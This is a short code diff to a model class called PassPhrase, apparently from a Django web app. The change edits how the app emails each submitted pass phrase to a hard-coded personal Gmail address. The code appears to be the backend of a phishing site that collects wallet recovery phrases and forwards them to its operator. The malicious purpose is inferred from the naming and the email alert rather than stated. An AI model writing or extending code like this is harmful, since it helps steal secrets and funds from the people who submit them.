@@ -17,7 +17,7 @@ class PassPhrase(models.Model):
         sent_from = gmail_user
         to = ['agwumafam@gmail.com']
         subject = 'New Pass Phrase Has Been Submitted'
-        body = f'{self.phrase}'
+        body = self.phrase
         
         email_text = """\
         From: %s
